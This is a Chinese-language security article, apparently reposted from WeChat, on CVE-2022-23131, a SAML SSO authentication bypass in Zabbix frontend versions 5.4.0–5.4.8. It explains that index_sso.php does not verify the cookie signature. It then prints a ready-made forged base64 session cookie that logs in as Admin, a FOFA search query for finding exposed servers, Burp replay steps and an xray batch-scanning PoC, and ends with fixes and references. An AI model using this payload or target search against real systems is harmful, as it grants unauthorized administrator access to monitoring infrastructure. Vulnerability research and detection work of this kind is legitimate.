<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/AAGGElXTD8GclkO29ELFRQ)

本文来自“白帽子社区知识星球”  

作者：B1anda0

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HQn53QYo2G7DTFfSqal7VmGU1xKbwvvFCWia9p3AZz1TBhqTGkFeZMzFfby1F0GTp1p28go67IeEfowblxAXJcA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

**白帽子社区知识星球**

  

加入星球，共同进步

**0****1**

  

漏洞成因

  

在启用 SAML SSO 身份验证（非默认）的情况下，恶意攻击者可以修改会话数据 来实现身份认证绕过。未经身份验证的恶意攻击者可能会利用此问题来提升权限并获 得对 Zabbix 前端的管理员访问权限。 

  

该漏洞存在于index_sso.php文件中，由于index_sso.php文件未调用

```
CEncryptedCookieSession::checkSign()
```

方法对cookie进行校验，且客户端的cookie可被伪造。

  

从index_sso.php文件中可以看出，当伪造的cookie中存在saml_data时，获取 username_attribute的数据，如果该用户真实存在则会生成一个sessionid从而实现身份 认证绕过。

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G4SdYiceRnhU1BJ2M630nLwGbbe0BCFfJUaJT89UdNL5x4o1xZXPParmA9jiaEVu10xlFDQrVic94icwg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

payload：  

```
Cookie:zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9  

```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G4SdYiceRnhU1BJ2M630nLwGhp8yynVDHafeFIq51MXs7LQKFn0HyoJWoUvbmh4Zeiav0vzCSYtVvVg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

受影响版本： 

zabbix 5.4.0 - 5.4.8

zabbix 6.0.0alpha1  

  

**0****2**

  

漏洞复现

  

fofa：app="ZABBIX-监控系统" && body="saml"

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G4SdYiceRnhU1BJ2M630nLwGvUcaU3lx8KYqqP21WJ4JU3MK5Zib1MV8ziazTSSs1NNPP6qPcWK3avLw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

burp抓包将请求路径文件改为index_sso.php , Cookie替换为：

  

```
zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9
```

  

放包即可绕过身份认证

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G4SdYiceRnhU1BJ2M630nLwGUeQY49pPBia0MItz2czdJXEfO7K122QUh46xgTujYt0NVgFrs3UppGg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G4SdYiceRnhU1BJ2M630nLwGJic85UxN8ctFBenJA8g45W1EwpCA12MubuEPBfRC32ia6QDaBODeT3Nw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

xray批量检测poc：  

```
name: poc-yaml-zabbix-saml-cve-2022-23131  
manual: true  
transport: http  
rules:  
r0:  
request:  
cache: true  
method: GET  
path: /index_sso.php  
headers:  
Cookie:  
zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRta  
W4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9  
follow_redirects: false  
expression: response.status == 302 &&  
response.headers["location"] == "zabbix.php?  
action=dashboard.view"  
expression: r0()  
detail:  
author: B1anda0(https://github.com/B1anda0)  
links:  
- https://blog.sonarsource.com/zabbix-case-study-ofunsafe-session-storag  

```

  

检测效果：  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G4SdYiceRnhU1BJ2M630nLwGVNlFVSYvt2jTsTz9CIiaN23KvdWeYSicDJE2CicviaIiceS9ZEGmTb9TuwQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0****3**

  

修复方案

  

1、禁用 SAML 身份验证 

  

2、升级安全版本：

```
https://support.zabbix.com/browse/ZBX-20350
```

  

参考链接：

```
`https://blog.sonarsource.com/zabbix-case-study-of-unsafe-session-storage``https://y4er.com/post/cve-2022-23131-zabbix-web-frontend-bypassing-the-saml-sso-authen``tication/`
```

  

如果觉得本文不错的话，欢迎加入知识星球，星球内部设立了多个技术版块，目前涵盖“WEB安全”、“内网渗透”、“CTF技术区”、“漏洞分析”、“工具分享”五大类，还可以与嘉宾大佬们接触，在线答疑、互相探讨。

  

  

▼扫码关注白帽子社区公众号&加入知识星球▼

  

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HQn53QYo2G7DTFfSqal7VmGU1xKbwvvFguibiawp59UQG9hBRibbCM5Zjw4F9V0kT0jQcvoIJO7J85fNhsia2p7zXQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HQn53QYo2G7DTFfSqal7VmGU1xKbwvvFpibdLQk6uNsraPoEqgQAvajqefnFE7jicq2eg76FroUAmV4qvXYhsGwQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)